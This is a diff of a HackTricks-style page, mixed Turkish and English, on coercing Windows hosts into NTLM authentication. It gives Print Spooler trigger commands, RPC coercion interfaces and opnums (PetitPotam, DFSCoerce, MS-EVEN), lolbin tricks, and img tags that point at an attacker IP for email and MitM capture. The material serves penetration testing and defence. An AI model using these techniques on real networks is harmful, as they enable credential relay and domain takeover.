@@ -1,63 +1,100 @@
-# NTLM Ayrıcalıklı Kimlik Doğrulamasını Zorlama
+# Force NTLM Privileged Authentication
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) , 3. parti bağımlılıkları önlemek için MIDL derleyicisi kullanılarak C# ile kodlanmış **uzaktan kimlik doğrulama tetikleyicileri** **koleksiyonu**dur.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.
 
-## Spooler Servisi İstismarı
+## Spooler Service Abuse
 
-Eğer _**Print Spooler**_ servisi **etkinse**, bazı bilinen AD kimlik bilgilerini kullanarak Alan Denetleyicisi’nin yazıcı sunucusundan yeni yazdırma görevleri hakkında bir **güncelleme** **talep** edebilir ve sadece **bildirimi bazı sistemlere göndermesini** söyleyebilirsiniz.\
-Yazıcı, bildirimi rastgele sistemlere gönderdiğinde, o **sistem** ile **kimlik doğrulaması yapması** gerekir. Bu nedenle, bir saldırgan _**Print Spooler**_ servisini rastgele bir sistemle kimlik doğrulaması yapacak şekilde yönlendirebilir ve hizmet bu kimlik doğrulamasında **bilgisayar hesabını** **kullanacaktır**.
+If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
+Dikkat edin: yazıcı bildirimi rastgele bir sisteme gönderdiğinde, o **sisteme karşı kimlik doğrulaması** yapması gerekir. Bu nedenle bir saldırgan, _**Print Spooler**_ servisinin rastgele bir sisteme kimlik doğrulaması yapmasını sağlayabilir ve servis bu kimlik doğrulamasında **bilgisayar hesabını** kullanacaktır.
 
-### Alan üzerindeki Windows Sunucularını Bulma
+### Finding Windows Servers on the domain
 
-PowerShell kullanarak, Windows kutularının bir listesini alın. Sunucular genellikle önceliklidir, bu yüzden oraya odaklanalım:
+Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Spooler hizmetlerini dinleme bulma
+### Spooler servislerinin dinlemede olup olmadığını bulma
 
-@mysmartlogin'in (Vincent Le Toux'un) biraz değiştirilmiş [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak, Spooler Hizmetinin dinleyip dinlemediğini kontrol edin:
+Biraz değiştirilmiş @mysmartlogin'in (Vincent Le Toux'un) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) aracını kullanarak Spooler Service'in dinlemede olup olmadığını kontrol edin:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-Linux'te rpcdump.py kullanabilir ve MS-RPRN Protokolü'nü arayabilirsiniz.
+Ayrıca Linux'ta rpcdump.py kullanabilir ve MS-RPRN Protocol için arama yapabilirsiniz.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Servisten rastgele bir ana bilgisayara kimlik doğrulaması yapmasını isteyin
+### Hizmetin rastgele bir hosta kimlik doğrulaması yapmasını isteyin
 
-Buradan **SpoolSample'ı derleyebilirsiniz**.
+Şunu derleyebilirsiniz: [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-ve [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın eğer Linux'taysanız
+veya Linux'taysanız [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) veya [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) kullanın
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Unconstrained Delegation ile Birleştirme
 
-Eğer bir saldırgan [Unconstrained Delegation](unconstrained-delegation.md) ile bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Kısıtlanmamış delegasyon nedeniyle, **yazıcının bilgisayar hesabının TGT'si** kısıtlanmamış delegasyona sahip bilgisayarın **belleğinde** **saklanacaktır**. Saldırgan bu ana bilgisayarı zaten ele geçirdiği için, **bu bileti alabilir** ve kötüye kullanabilir ([Pass the Ticket](pass-the-ticket.md)).
+Eğer bir saldırgan zaten [Unconstrained Delegation](unconstrained-delegation.md) olan bir bilgisayarı ele geçirmişse, saldırgan **yazıcının bu bilgisayara kimlik doğrulaması yapmasını sağlayabilir**. Unconstrained delegation nedeniyle, yazıcının bilgisayar hesabının **TGT**'si unconstrained delegation olan bilgisayarın **belleğinde saklanacaktır**. Saldırgan bu hostu zaten ele geçirmiş olduğundan, bu bileti **alabilecek** ve kötüye kullanabilecektir ([Pass the Ticket](pass-the-ticket.md)).
 
-## RCP Zorla Kimlik Doğrulama
+## RPC Kimlik Doğrulamayı Zorlama
 
-{{#ref}}
-https://github.com/p0dalirius/Coercer
-{{#endref}}
+[Coercer](https://github.com/p0dalirius/Coercer)
+
+### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
+- MS-RPRN (Print System Remote Protocol)
+- Pipe: \\PIPE\\spoolss
+- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
+- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
+- Tools: PrinterBug / PrintNightmare-family
+- MS-PAR (Print System Asynchronous Remote)
+- Pipe: \\PIPE\\spoolss
+- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
+- Opnum: 0 RpcAsyncOpenPrinter
+- MS-EFSR (Encrypting File System Remote Protocol)
+- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
+- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
+- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
+- Tool: PetitPotam
+- MS-DFSNM (DFS Namespace Management)
+- Pipe: \\PIPE\\netdfs
+- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
+- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
+- Tool: DFSCoerce
+- MS-FSRVP (File Server Remote VSS)
+- Pipe: \\PIPE\\FssagentRpc
+- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
+- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
+- Tool: ShadowCoerce
+- MS-EVEN (EventLog Remoting)
+- Pipe: \\PIPE\\even
+- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
+- Opnum: 9 ElfrOpenBELW
+- Tool: CheeseOunce
+
+Not: Bu yöntemler, UNC yolunu taşıyabilecek parametreleri kabul eder (ör. `\\attacker\share`). İşlendiklerinde, Windows belirtilen UNC'ye (makine/kullanıcı bağlamında) kimlik doğrulaması yapar; bu NetNTLM yakalama veya relay yapılmasına olanak sağlar.
+
+### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
+- Arayüz: MS-EVEN, \\PIPE\\even üzerinden (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
+- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
+- Etki: hedef sağlanan yedek günlük yolunu açmayı dener ve saldırgan kontrollü UNC'ye kimlik doğrular.
+- Pratik kullanım: Tier 0 varlıkları (DC/RODC/Citrix/etc.) NetNTLM yayımlamaya zorlayın, ardından AD CS uç noktalarına (ESC8/ESC11 senaryoları) veya diğer ayrıcalıklı servislerde relay yapmak için kullanın.
 
 ## PrivExchange
 
-`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatanın sonucudur. Bu özellik, Exchange sunucusunun, bir posta kutusuna sahip herhangi bir alan kullanıcısı tarafından HTTP üzerinden herhangi bir istemci sağlanan ana bilgisayara kimlik doğrulaması yapmaya zorlanmasını sağlar.
+`PrivExchange` saldırısı, **Exchange Server `PushSubscription` özelliğinde** bulunan bir hatadan kaynaklanır. Bu özellik, posta kutusuna sahip herhangi bir domain kullanıcısının Exchange sunucusunu herhangi bir istemci tarafından sağlanan hosta HTTP üzerinden kimlik doğrulamaya zorlamasına izin verir.
 
-Varsayılan olarak, **Exchange hizmeti SYSTEM olarak çalışır** ve aşırı ayrıcalıklara sahiptir (özellikle, **2019'dan önceki Kümülatif Güncelleme üzerinde WriteDacl ayrıcalıklarına sahiptir**). Bu hata, **LDAP'ye bilgi iletimini sağlamak ve ardından alan NTDS veritabanını çıkarmak** için kullanılabilir. LDAP'ye iletim mümkün olmadığında bile, bu hata alan içindeki diğer ana bilgisayarlara iletim ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı bir şekilde istismar edilmesi, herhangi bir kimlik doğrulaması yapılmış alan kullanıcı hesabıyla Alan Yöneticisi'ne anında erişim sağlar.
+Varsayılan olarak, **Exchange service runs as SYSTEM** ve fazladan ayrıcalıklar verilir (özellikle, **2019 öncesi Cumulative Update'te domain üzerinde WriteDacl ayrıcalığına sahiptir**). Bu hata, bilgilerin **LDAP'a relay edilmesi ve sonucunda domain NTDS veritabanının çıkarılması** için kullanılabilir. LDAP'a relay mümkün olmadığında bile, bu hata domain içindeki diğer hostlara relay ve kimlik doğrulama yapmak için kullanılabilir. Bu saldırının başarılı şekilde kullanılması, doğrulanmış herhangi bir domain kullanıcı hesabıyla anında **Domain Admin** erişimi sağlar.
 
 ## Windows İçinde
 
-Eğer zaten Windows makinesinin içindeyseniz, Windows'u ayrıcalıklı hesaplarla bir sunucuya bağlanmaya zorlayabilirsiniz:
+Eğer zaten Windows makinesinin içindeyseniz, Windows'un ayrıcalıklı hesaplarla bir sunucuya bağlanmasını şu araçlarla zorlayabilirsiniz:
 
 ### Defender MpCmdRun
 ```bash
@@ -82,36 +119,45 @@ Ya da bu diğer tekniği kullanın: [https://github.com/p0dalirius/MSSQL-Analysi
 
 ### Certutil
 
-NTLM kimlik doğrulamasını zorlamak için certutil.exe lolbin (Microsoft imzalı ikili) kullanmak mümkündür:
+NTLM kimlik doğrulamasını zorlamak için certutil.exe lolbin (Microsoft-signed binary) kullanmak mümkündür:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
-## HTML enjeksiyonu
+## HTML injection
 
-### E-posta ile
+### Via email
 
-Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **e-posta adresini** biliyorsanız, ona sadece **1x1 piksel boyutunda bir resim içeren bir e-posta** gönderebilirsiniz.
+Eğer ele geçirmek istediğiniz bir makineye giriş yapan kullanıcının **email address**'ini biliyorsanız, ona aşağıdakine benzer bir **email with a 1x1 image** gönderebilirsiniz:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-ve açtığında, kimlik doğrulamaya çalışacaktır.
+ve o açtığında kimlik doğrulamaya çalışacaktır.
 
 ### MitM
 
-Eğer bir bilgisayara MitM saldırısı gerçekleştirebilir ve bir sayfaya HTML enjekte edebilirseniz, sayfada aşağıdaki gibi bir resmi enjekte etmeyi deneyebilirsiniz:
+Eğer bir bilgisayara MitM attack gerçekleştirebilir ve görüntülediği sayfaya HTML inject edebilirseniz, sayfaya aşağıdaki gibi bir image inject etmeyi deneyebilirsiniz:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## NTLM kimlik doğrulamasını zorlamak ve oltalama için diğer yollar
+## NTLM kimlik doğrulamasını zorlamak ve oltalamak için diğer yollar
 
 
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-## NTLMv1 Kırma
+## NTLMv1'i Kırmak
 
-Eğer [NTLMv1 zorluklarını yakalayabilirseniz, onları nasıl kıracağınızı buradan okuyun](../ntlm/index.html#ntlmv1-attack).\
-_NTLv1'i kırmak için Responder zorluğunu "1122334455667788" olarak ayarlamanız gerektiğini unutmayın._
+Eğer [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack) yakalayabiliyorsanız.\
+_NTLMv1'i kırmak için Responder challenge değerini "1122334455667788" olarak ayarlamanız gerektiğini unutmayın_
+
+## Referanslar
+- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
+- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
+- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
+- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
+- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
+- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
+- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
 
 {{#include ../../banners/hacktricks-training.md}}
